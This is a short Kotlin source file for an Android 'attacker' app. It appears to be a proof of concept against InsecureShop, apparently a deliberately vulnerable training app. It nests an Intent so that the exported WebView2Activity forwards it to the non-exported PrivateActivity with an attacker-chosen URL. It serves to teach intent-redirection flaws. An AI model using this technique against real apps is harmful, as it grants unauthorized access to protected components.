package com.example.attackerintentredirect

import android.annotation.SuppressLint
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.view.View
import android.widget.Button
import android.content.Intent

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val btn = findViewById<Button>(R.id.btn)
    }

    fun btn(view: View) {

        val extra = Intent()
        extra.setClassName("com.insecureshop", "com.insecureshop.PrivateActivity")
        extra.putExtra("url", "http://erev0s.com/")

        val intent = Intent()
        intent.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity")
        intent.putExtra("extra_intent", extra)
        startActivity(intent)
    }
}